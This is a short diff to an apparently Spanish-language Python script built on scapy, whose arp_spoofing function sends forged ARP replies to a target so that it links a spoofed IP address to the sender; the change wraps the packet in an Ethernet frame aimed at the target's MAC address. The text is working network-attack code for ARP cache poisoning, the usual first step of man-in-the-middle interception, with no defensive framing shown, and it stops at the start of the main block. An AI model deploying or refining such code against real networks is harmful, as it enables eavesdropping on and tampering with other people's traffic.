@@ -1,10 +1,10 @@
-from scapy.all import ARP, send
+from scapy.all import ARP, Ether, send
 import time
 import sys
 
 def arp_spoofing(targetIP, targetMAC, spoofIP):
     print(f"Enviando un paquete ARP a {targetIP}")
-    paquete = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
+    paquete = Ether(dst=targetMAC) / ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
     send(paquete, verbose=False)
 
 if __name__ == "__main__":
